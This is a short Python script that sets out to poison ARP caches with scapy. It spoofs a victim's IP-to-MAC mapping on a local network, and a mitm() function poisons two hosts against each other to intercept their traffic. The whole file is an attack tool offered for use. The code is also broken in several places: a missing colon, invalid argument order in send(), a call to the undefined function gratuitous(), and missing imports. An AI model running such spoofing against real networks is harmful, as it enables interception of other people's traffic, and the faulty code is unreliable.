#! /usr/bin/env python
'''
A very basic spoofer which does arp cache poisoning
on a victim by claiming an IP address (via cmd line)
'''
import sys
import os
import os.path
import argparse

from scapy.all import arpcachepoison 

def unsolicited(victim, claimed, interval):
  '''
  Send gratuitous ARP replies to <victim> every <interval>,
  with <claimed> as SPA and all other fields normal
  '''
  # Construct an ARP reply packet
  a = ARP
  a.op = 2
  a.pdst = victim
  a.psrc = claimed

  # Send this packet with the given interval
  send(a, loop = 1, interval)

def all_hosts():
  '''
  Return the IPs of all hosts on the LAN
  '''
  # TODO: simple scan of network to see what hosts are up
  # low priority- other tools can already do this easily (nmap)
  hosts = []
  return hosts


def spoof(victim, claimed, interval = 5, mode = 'request'):
  '''
  Use scapy's builtin arpcachepoison to do spoofing attack,
  unless otherwise specified (ie. gratuitious replies).
  '''
  # TODO: allow multiple victims at once
  if mode == 'request':
    print 'arpcachepoison'
    arpcachepoison(victim, claimed, interval)
  else:
    gratuitous(victim, claimed, interval)

def mitm(host1, host2, interval = 5, mode = 'request')
  '''
  Initiate a MITM attack between host1 and host2,
  optionally using the gratuitous reply mode.
  Also optionally supports different intervals.
  '''

  # This may not work due to not interleaving
  # packets. TODO: test, switch to interleaving
  # if necessary
  spoof(host1, host2, interval, mode)
  spoof(host2, host1, interval, mode)

def main():
  parser = argparse.ArgumentParser(description='Send spoofed ARP packets.')
  parser.add_argument('victim', metavar='V', nargs=1,
                    help='the victim of this attack')
  parser.add_argument('claimed', metavar='C', nargs=1,
                    help='the IP to associate with the attacker MAC')
  parser.add_argument('-u', '--unsolicited', action='store_true',
                    help='Use unsolicited ARP replies instead of requests')
  args = parser.parse_args()
  '''
  if len(sys.argv) != 3:
    print("Usage: %s victim claimed (gateway)" % sys.argv[0])
    sys.exit(2)
  '''
  print("CTRL C to stop spoofing")
  # victim is the IP of the receiver of spoofed packets
  # claimed is the IP which is claimed by spoofed packets
  victim = args.victim[0]
  claimed = args.claimed[0]
  if args.unsolicited:
    unsolicited(victim, claimed)
  else:
    spoof(victim, claimed)

if __name__ == '__main__':
  main()
